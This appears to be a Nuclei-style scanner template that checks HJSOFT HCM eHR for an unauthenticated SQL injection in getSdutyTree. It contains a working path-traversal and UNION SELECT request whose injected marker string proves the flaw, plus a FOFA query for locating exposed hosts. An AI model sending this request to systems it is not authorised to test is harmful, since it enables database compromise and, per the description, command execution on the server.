http:
- matchers:
  - part: body
    type: word
    words:
    - qxjpqjWUIWcKtHqhks
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/w_selfservice/oauthservlet/%2e./.%2e/servlet/sduty/getSdutyTree?param=child&target=1&codesetid=1&codeitemid=1%27+UNION+ALL+SELECT+NULL%2CCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28119%29%2BCHAR%2885%29%2BCHAR%2873%29%2BCHAR%2887%29%2BCHAR%2899%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2872%29%2BCHAR%28113%29%2BCHAR%28104%29%2BCHAR%28107%29%2BCHAR%2889%29%2BCHAR%28115%29%2BCHAR%28108%29%2BCHAR%2873%29%2BCHAR%2884%29%2BCHAR%2869%29%2BCHAR%2873%29%2BCHAR%2875%29%2BCHAR%2883%29%2BCHAR%2898%29%2BCHAR%28116%29%2BCHAR%28120%29%2BCHAR%2889%29%2BCHAR%2884%29%2BCHAR%2882%29%2BCHAR%28120%29%2BCHAR%2884%29%2BCHAR%28116%29%2BCHAR%2888%29%2BCHAR%28112%29%2BCHAR%2887%29%2BCHAR%2873%29%2BCHAR%28109%29%2BCHAR%28104%29%2BCHAR%2887%29%2BCHAR%28102%29%2BCHAR%2897%29%2BCHAR%2877%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28113%29%2CNULL%2CNULL--+Iprd'
id: hjsoft-hcm-getsdutytree-sqli
info:
  author: Co5mos
  description: "\u5B8F\u666FeHR /servlet/sduty/getSdutyTree \u63A5\u53E3\u5B58\u5728\
    SQL\u6CE8\u5165\u6F0F\u6D1E\uFF0C\u672A\u7ECF\u8EAB\u4EFD\u9A8C\u8BC1\u7684\u8FDC\
    \u7A0B\u653B\u51FB\u8005\u901A\u8FC7\u5229\u7528SQL\u6CE8\u5165\u6F0F\u6D1E\u914D\
    \u5408\u6570\u636E\u5E93xp_cmdshell\u53EF\u4EE5\u6267\u884C\u4EFB\u610F\u547D\u4EE4\
    \uFF0C\u4ECE\u800C\u63A7\u5236\u670D\u52A1\u5668\u3002\u7ECF\u8FC7\u5206\u6790\
    \u4E0E\u7814\u5224\uFF0C\u8BE5\u6F0F\u6D1E\u5229\u7528\u96BE\u5EA6\u4F4E\uFF0C\
    \u5EFA\u8BAE\u5C3D\u5FEB\u4FEE\u590D\u3002\n"
  metadata:
    fofa-query: app="HJSOFT-HCM"
  name: HJSOFT HCM getSdutyTree SQL Injection
  reference:
  - https://github.com/wy876/POC/blob/main/%E5%AE%8F%E6%99%AFeHR%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3getSdutyTree%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  severity: critical
  tags: sqli, hjsoft
